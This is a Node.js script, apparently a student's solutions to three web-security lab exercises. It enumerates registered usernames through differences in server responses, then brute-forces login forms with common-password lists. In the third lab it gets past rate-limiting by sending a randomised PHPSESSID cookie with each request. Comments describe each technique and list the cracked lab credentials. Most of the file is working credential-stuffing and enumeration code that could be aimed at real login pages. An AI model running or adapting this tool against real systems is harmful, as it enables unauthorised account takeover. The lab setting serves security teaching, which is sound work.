const axios = require('axios')
const qs = require('qs');
const chalk = require('chalk')

const listOfUsernames1 = ["AAATREEBOY", "AcidDawn", "AcidDragon", "Acid_Grin", "AcidicAngle", "AcidicBeast", "AcidicCraft", "AcidicIronTooth", "Acidically", "BAILEY16", "Bailee", "Bailee_Waid", "Bailey0799", "BaileyBunch", "BaileyHazeldine", "BaileyKouw", "BaileyLeConte", "Bailey_", "Bailey_18", "Bailey_Boo", "CallMeKaleb", "CallMeTuesdays", "CallMeVideo", "CallMehSweet", "CallOfDuty1295", "CallOfRolli", "CallOfSeak", "CallSkyhawk", "Call_of_Duty2015", "CallofDuty", "Callofmygun", "CallsignStreak", "Callstrike", "aa_broom", "aaatam", "aaawsome2", "aab1234567890", "aaberg", "aabisha", "achuth", "acicula", "acicular", "aciculate", "aciculum", "acid", "acid1212", "acidargyle", "acidfast", "acidforming", "acidhead", "acidic", "acidic7", "acidicblitzz", "acidicparasite", "bailable", "bailar", "bailboy91", "bailer007", "bailes", "bailey", "bailey123123123", "bailey531", "bailey5613", "bailey60558", "bailey713", "bailey_ingram", "baileyajayi", "baileybailie", "baileybanks58", "baileycool1", "baileycphy", "baileydebortoli", "baileyemili", "baileym12", "call_of_cheese", "call_of_duty47", "callmehere", "callmehoptimus", "callmetuny", "callob", "callofMntDewty", "callofcheese900", "callofdutychick", "callofdutydude", "callofdutykilr", "callofett65", "callofthedead98", "callofthedeadz2", "callosity", "callous", "callow", "calloway", "callrocks", "calltopower1", "callu123", "callum"]
const listOfPasswords1 = ["1234", "12345", "123456", "12345678", "1313", "654321", "696969", "7777777", "987654", "amateur", "beach", "black", "bond007", "butter", "cameron", "chelsea", "computer", "cool", "cooper", "diamond", "dragon", "firebird", "golf", "great", "guitar", "jackson", "jaguar", "letmein", "madison", "mountain", "muffin", "murphy", "mustang", "nascar", "password", "porsche", "prince", "pussy", "qwerty", "redsox", "rosebud", "scorpio", "shannon", "star", "steelers", "testing", "tiffany", "tomcat", "turtle", "united", "zxcvbn"]
const url1 = 'http://webapphost/Decamp/Chapter6/lab1/login.php'

const listOfUsernames2 = ["Elchen_2", "el_chocle", "ElChuckyneitor", "ElCidCrafteador", "elconin", "ElConquistador", "elcoolion", "ElCorko", "elcrafteur", "El_Crafto", "ElCrisco", "ElCristo8", "elCZstrickey", "eld", "elda", "eldaelden", "elDanXD", "elda_oromis", "eldar", "eldenelder", "eldenker", "elder", "Elder", "Elder1", "ElderAidsMage", "Elderand", "entitle", "entity", "entity0x", "entity_303", "Entity303", "EntityBean", "ento", "ENTO22", "entoan", "entoblast", "entoderm", "entoil", "entomb", "entomo", "entomologize", "entomology", "entomophagous", "entomophilous", "entomostracan", "EnToony", "entophyte", "entopic", "entourage", "entozoic", "entozoon", "entr", "entrails", "entrain", "entrammel", "entrance", "EntrancedCape5", "entranceway", "entrant", "entrap", "entreat", "entreaty", "entrechat", "entree", "gastrin", "gastritis", "gastro", "gastrocnemius", "gastroenteritis", "gastroenterology", "gastroenterostomy", "gastrointestinal", "gastrolith", "gastrolizard", "gastrology", "Gastronam", "gastronome", "gastronomy", "gastropod", "gastroscope", "gastrostomy", "gastrotomy", "gastrotrich", "gastrovascular", "gastrula", "gastrulation", "gasts", "gasttest", "gastuser", "Gasuros", "gasworks", "Gasyboy", "Gasymexican", "gat", "Gatanater", "Gatchi"];
const listOfPasswords2 = ["amanda", "bear", "frank", "brazil", "baseball", "wizard", "tiger", "hannah", "lauren", "master", "xxxxxxxx", "doctor", "dave", "japan", "michael", "money", "gateway", "eagle1", "naked", "football", "phoenix", "gators", "11111", "squirt", "shadow", "mickey", "angel", "mother", "stars", "monkey", "bailey", "junior", "nathan", "apple", "abc123", "knight", "thx1138", "raiders", "alexis", "pass", "iceman", "porno", "steve", "aaaa", "fuckme", "tigers", "badboy", "forever", "bonnie"];
const url2 = 'http://webapphost/Decamp/Chapter6/lab2/login.php'


const listOfUsernames3 = ["Elchen_2", "el_chocle", "ElChuckyneitor", "ElCidCrafteador", "elconin", "ElConquistador", "elcoolion", "ElCorko", "elcrafteur", "El_Crafto", "ElCrisco", "ElCristo8", "elCZstrickey", "eld", "elda", "eldaelden", "elDanXD", "elda_oromis", "eldar", "eldenelder", "eldenker", "elder", "Elder", "Elder1", "ElderAidsMage", "Elderand", "entitle", "entity", "entity0x", "entity_303", "Entity303", "EntityBean", "ento", "ENTO22", "entoan", "entoblast", "entoderm", "entoil", "entomb", "entomo", "entomologize", "entomology", "entomophagous", "entomophilous", "entomostracan", "EnToony", "entophyte", "entopic", "entourage", "entozoic", "entozoon", "entr", "entrails", "entrain", "entrammel", "entrance", "EntrancedCape5", "entranceway", "entrant", "entrap", "entreat", "entreaty", "entrechat", "entree", "gastrin", "gastritis", "gastro", "gastrocnemius", "gastroenteritis", "gastroenterology", "gastroenterostomy", "gastrointestinal", "gastrolith", "gastrolizard", "gastrology", "Gastronam", "gastronome", "gastronomy", "gastropod", "gastroscope", "gastrostomy", "gastrotomy", "gastrotrich", "gastrovascular", "gastrula", "gastrulation", "gasts", "gasttest", "gastuser", "Gasuros", "gasworks", "Gasyboy", "Gasymexican", "gat", "Gatanater", "Gatchi"]
const listOfPasswords3 = ["amanda", "bear", "frank", "brazil", "baseball", "wizard", "tiger", "hannah", "lauren", "master", "xxxxxxxx", "doctor", "dave", "japan", "michael", "money", "gateway", "eagle1", "naked", "football", "phoenix", "gators", "11111", "squirt", "shadow", "mickey", "angel", "mother", "stars", "monkey", "bailey", "junior", "nathan", "apple", "abc123", "knight", "thx1138", "raiders", "alexis", "pass", "iceman", "porno", "steve", "aaaa", "fuckme", "tigers", "badboy", "forever", "bonnie"];
const url3 = 'http://webapphost/Decamp/Chapter6/lab3/login.php'

let laps = 0;
let runs = 0;
const approved = []


const start = async (name, pass, url, apprLength, forbiddenLength) => {
  console.log(`Runs in total ${name.length * pass.length}`)
  await sleep(1000)
  try{

    if(forbiddenLength === undefined){
      forbiddenLength = (await axios.post(url,
        qs.stringify({
          username: 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww',
          password: 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww',
          submit: 'Login'
        }), 
        { 
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "PHPSESSID="+Math.random().toString(2).substring(1,27)
          }
        })).data.length
      console.log('Setting length of "forbidden" to:',chalk.yellowBright(forbiddenLength))
      await sleep(5000)
    }

    await asyncForEach(name, async (un) => {
      console.log("*STOP*", laps)
      laps++;
      await asyncForEach(pass, async (up) => {
        const res = await axios.post(url,
        qs.stringify({
          username: un,
          password: up,
          submit: 'Login'
        }), 
        { 
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "PHPSESSID="+Math.random().toString(2).substring(1,27)
          }
        })
        console.log( runs, {un, up})
        console.log('length:', res.data.length, '\n')

        //console.log(res.data, res.data.length)

        if(res.data.length !== forbiddenLength){
          approved.push({
            username: un,
            password: up
          })
          console.log('\n',{
            username: un,
            password: up
          })
          if(approved.length === apprLength){
            console.log('\n********************** FINISHED *********************\n');
            approved.forEach( user => {
              console.log(`username: ${user.username}`);
              console.log(`password: ${user.password}\n`)
            })
            console.log('*****************************************************\n')
            process.exit();
          }
          await sleep(1000)
        }
        
        runs++;
        if(runs === (name.length * pass.length)) {
          console.log('\n********************** FINISHED *********************\n');
          approved.forEach( user => {
            console.log(`username: ${user.username}`);
            console.log(`password: ${user.password}\n`)
          })
          console.log('*****************************************************\n')
        }
      })
    })
  }catch(e){
    console.log(e)
  }
  
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
  
async function asyncForEach(array, callback) {
  for (let index = 0; index < array.length; index++) {
    await callback(array[index], index, array);
  }
}


/* Assignment 1 */

/*
  Solution:
  On registration, user is told if name is already registered. I parsed all registered names to separate array by comparing length of the response.
  After that I brute forced all registered names, by posting username + password data to login url, 
  thus getting 3 right combinations by comparing responses' lengths.

  ********************** FINISHED *********************

  username: Bailey_18
  password: united

  username: aa_broom
  password: steelers

  username: callrocks
  password: scorpio

  *****************************************************
*/

const Assignment1 = async () => {

  const filteredUsernames = []

  await asyncForEach(listOfUsernames1, async (un) => {
    const res = await axios.post('http://webapphost/Decamp/Chapter6/lab1/registration.php', qs.stringify({
      username: un,
      email: 'placeholder@smth.com',
      password: 'placeholder',
      submit: 'Register'
    }),
    { 
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      }
    });
    
    if(res.data.length === 273){
      filteredUsernames.push(un)
    }
  })
  start(filteredUsernames,listOfPasswords1, url1, 3)

}

/****************/


/* Assignment 2 */

/*
  Solution:
  On login, response html code has minor difference in spacing if username is 
  registered (... is incorrect.</h3><br/> ...) or not (... is incorrect. </h3><br/> ...). 
  Because of that spacing difference responses become comperable as strings.

  I separated already registered usernames to another array by comparing response strings.

  After that I brute forced all registered names, by posting username + password data to login url, 
  thus getting 3 right combinations by comparing responses' lengths.

  ********************** FINISHED *********************

  username: ElConquistador
  password: junior

  username: EnToony
  password: tigers

  username: gastrotomy
  password: money

  *****************************************************
*/

const Assignment2 = async () => {

  const filteredUsernames = []

  const forbiddenResponse = (await axios.post('http://webapphost/Decamp/Chapter6/lab2/login.php',
    qs.stringify({
      username: 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww',
      password: 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww',
      submit: 'Login'
    }), 
    { 
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      }
    })).data
  console.log('"forbiddenResponse":\n',chalk.yellowBright(forbiddenResponse))
  await sleep(5000)

  await asyncForEach(listOfUsernames2, async (un) => {
    const res = await axios.post('http://webapphost/Decamp/Chapter6/lab2/login.php', 
    qs.stringify({
      username: un,
      email: 'placeholder@smth.com',
      password: 'placeholder',
      submit: 'Register'
    }),
    { 
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      }
    });
    
    

    if(res.data !== forbiddenResponse){
      filteredUsernames.push(un)
    }
  })
  start(filteredUsernames,listOfPasswords2, url2, 3)

}

/****************/


/* Assignment 3 */

/*
  Solution:
  First I registered correct username and started checking what differs in responces between correct and false username requests.
  I foundout, that difference in responces is the same, as in assignment 2, but this time, there is SPAM protection on login page.
  To overcome that protection, I modified my script so I it always sends random PHPSESSID as a Cookie.
  Then I just used solution from assignment 2 .
  After that I brute forced all registered names, by posting username + password data to login url, thus getting 3 right combinations by comparing responses' lengths.

  ********************** FINISHED *********************

  username: eldaelden
  password: 11111

  username: Entity303
  password: thx1138

  username: gastuser
  password: dave

  *****************************************************
*/

const Assignment3 = async () => {

  const filteredUsernames = []

  const forbiddenResponse = (await axios.post('http://webapphost/Decamp/Chapter6/lab3/login.php',
    qs.stringify({
      username: 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww',
      password: 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww',
      submit: 'Login'
    }), 
    { 
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "PHPSESSID="+Math.random().toString(2).substring(1,27)
      }
    })).data
  console.log('"forbiddenResponse":\n',chalk.yellowBright(forbiddenResponse))
  await sleep(5000)

  await asyncForEach(listOfUsernames3, async (un) => {
    const res = await axios.post('http://webapphost/Decamp/Chapter6/lab3/login.php', 
    qs.stringify({
      username: un,
      email: 'placeholder@smth.com',
      password: 'placeholder',
      submit: 'Register'
    }),
    { 
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "PHPSESSID="+Math.random().toString(2).substring(1,27)
      }
    });
    
    

    if(res.data !== forbiddenResponse){
      filteredUsernames.push(un)
    }
  })
  start(filteredUsernames,listOfPasswords3, url3, 3)

}

/****************/

const main = async (assignment) => {

  switch(assignment){
    case 1:
      await Assignment1()

      break;
    case 2:
      await Assignment2()

      break;
    case 3:
      await Assignment3()

      break;
  }
}

//main munction
main(/*write number of assignment*/)
